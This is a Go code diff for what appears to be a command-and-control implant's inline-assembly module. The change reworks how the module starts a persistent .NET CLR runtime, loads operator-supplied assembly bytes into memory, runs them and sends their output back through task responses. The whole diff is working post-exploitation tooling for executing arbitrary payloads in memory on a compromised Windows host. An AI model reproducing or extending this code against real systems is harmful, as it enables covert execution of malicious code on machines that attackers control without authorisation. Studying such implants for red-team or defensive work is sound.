@@ -42,6 +42,8 @@ import (
 
 var (
 	assemblyMutex sync.Mutex
+	runtimeHost   *clr.ICORRuntimeHost
+	clrStarted    bool
 )
 
 // InlineAssemblyCommand implements the inline-assembly command
@@ -143,63 +145,72 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		args = strings.Fields(params.Arguments)
 	}
 
-	// Redirect STDOUT/STDERR to capture assembly output
-	err = clr.RedirectStdoutStderr()
-	if err != nil {
-		// Non-fatal, just log it
-		task.Job.SendResponses <- structs.Response{
-			TaskID:     task.ID,
-			UserOutput: fmt.Sprintf("Warning: Could not redirect output: %v\nProceeding with execution...", err),
-			Status:     "processing",
-			Completed:  false,
+	// Lock mutex for thread safety
+	assemblyMutex.Lock()
+	defer assemblyMutex.Unlock()
+
+	// Build output
+	var output strings.Builder
+	output.WriteString(fmt.Sprintf("[*] Received assembly: %d bytes\n", len(assemblyBytes)))
+	output.WriteString(fmt.Sprintf("[*] Arguments: %s\n", params.Arguments))
+
+	// Ensure CLR is started (Merlin approach: keep persistent runtime host)
+	if !clrStarted {
+		output.WriteString("[*] Starting CLR v4...\n")
+		
+		// Redirect STDOUT/STDERR once when starting CLR
+		err = clr.RedirectStdoutStderr()
+		if err != nil {
+			output.WriteString(fmt.Sprintf("Warning: Could not redirect output: %v\n", err))
 		}
+		
+		runtimeHost, err = clr.LoadCLR("v4")
+		if err != nil {
+			output.WriteString(fmt.Sprintf("[!] Error loading CLR: %v\n", err))
+			return structs.CommandResult{
+				Output:    output.String(),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		clrStarted = true
+		output.WriteString("[+] CLR started successfully\n")
 	}
 
-	// Send execution status
+	// Send progress update
 	task.Job.SendResponses <- structs.Response{
 		TaskID:     task.ID,
-		UserOutput: fmt.Sprintf("[*] Executing assembly with %d argument(s)...", len(args)),
+		UserOutput: output.String(),
 		Status:     "processing",
 		Completed:  false,
 	}
 
-	// Execute the assembly using ExecuteByteArray which handles CLR loading internally
-	// This is more reliable than trying to manage the runtime host ourselves
-	var retCode int32
-	var execErr error
+	// Step 1: Load the assembly (Merlin approach)
+	output.Reset()
+	output.WriteString("[*] Loading assembly into CLR...\n")
+	
+	var methodInfo *clr.MethodInfo
+	var loadErr error
 	
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				execErr = fmt.Errorf("PANIC during assembly execution: %v", r)
+				loadErr = fmt.Errorf("PANIC during LoadAssembly: %v", r)
 			}
 		}()
 		
-		// Use ExecuteByteArray which handles everything internally
-		retCode, execErr = clr.ExecuteByteArray("v4", assemblyBytes, args)
+		methodInfo, loadErr = clr.LoadAssembly(runtimeHost, assemblyBytes)
 	}()
 
-	// Build output
-	var output strings.Builder
-	output.WriteString(fmt.Sprintf("[+] Assembly executed (%d bytes)\n", len(assemblyBytes)))
-	output.WriteString(fmt.Sprintf("[+] Return code: %d\n", retCode))
-	
-	if len(args) > 0 {
-		output.WriteString(fmt.Sprintf("[+] Arguments: %s\n", params.Arguments))
-	}
-
-	if execErr != nil {
-		output.WriteString("\n=== EXECUTION ERROR ===\n")
-		output.WriteString(fmt.Sprintf("%v\n", execErr))
-		
-		if strings.Contains(execErr.Error(), "cannot find") || strings.Contains(execErr.Error(), "not found") {
-			output.WriteString("\nTroubleshooting tips:\n")
-			output.WriteString("  - Ensure the assembly is a valid .NET Framework executable (.exe)\n")
-			output.WriteString("  - Ensure it targets .NET Framework 4.x (not .NET Core/.NET 5+)\n")
-			output.WriteString("  - Check that Main() signature is: static void Main(string[] args)\n")
-			output.WriteString("  - Verify no external dependencies are required\n")
-			output.WriteString(fmt.Sprintf("  - Assembly size received: %d bytes\n", len(assemblyBytes)))
-		}
+	if loadErr != nil {
+		output.WriteString("\n=== LOAD ERROR ===\n")
+		output.WriteString(fmt.Sprintf("%v\n\n", loadErr))
+		output.WriteString("Troubleshooting tips:\n")
+		output.WriteString("  - Ensure the assembly is a valid .NET Framework executable (.exe)\n")
+		output.WriteString("  - Ensure it targets .NET Framework 4.x (not .NET Core/.NET 5+)\n")
+		output.WriteString("  - Check that the assembly has a valid Main() entry point\n")
+		output.WriteString("  - Verify the assembly is not corrupted\n")
+		output.WriteString(fmt.Sprintf("  - Assembly size: %d bytes\n", len(assemblyBytes)))
 		
 		return structs.CommandResult{
 			Output:    output.String(),
@@ -208,7 +219,66 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		}
 	}
 
-	output.WriteString("\n[*] Assembly executed successfully\n")
+	output.WriteString("[+] Assembly loaded successfully\n")
+	
+	// Send progress update
+	task.Job.SendResponses <- structs.Response{
+		TaskID:     task.ID,
+		UserOutput: output.String(),
+		Status:     "processing",
+		Completed:  false,
+	}
+
+	// Step 2: Invoke the assembly (Merlin approach)
+	output.Reset()
+	output.WriteString(fmt.Sprintf("[*] Invoking assembly with %d argument(s)...\n", len(args)))
+	
+	var stdout, stderr string
+	var invokeErr error
+	
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %v", r)
+			}
+		}()
+		
+		stdout, stderr = clr.InvokeAssembly(methodInfo, args)
+	}()
+
+	if invokeErr != nil {
+		output.WriteString("\n=== INVOKE ERROR ===\n")
+		output.WriteString(fmt.Sprintf("%v\n\n", invokeErr))
+		output.WriteString("Troubleshooting tips:\n")
+		output.WriteString("  - Check that Main() signature is: static void Main(string[] args) or static int Main(string[] args)\n")
+		output.WriteString("  - Verify no external dependencies are required\n")
+		output.WriteString("  - Try running the assembly at command line first\n")
+		
+		return structs.CommandResult{
+			Output:    output.String(),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	output.WriteString("[+] Assembly executed successfully\n\n")
+	
+	// Add assembly output
+	if stdout != "" {
+		output.WriteString("=== STDOUT ===\n")
+		output.WriteString(stdout)
+		if !strings.HasSuffix(stdout, "\n") {
+			output.WriteString("\n")
+		}
+	}
+	
+	if stderr != "" {
+		output.WriteString("\n=== STDERR ===\n")
+		output.WriteString(stderr)
+		if !strings.HasSuffix(stderr, "\n") {
+			output.WriteString("\n")
+		}
+	}
 
 	return structs.CommandResult{
 		Output:    output.String(),
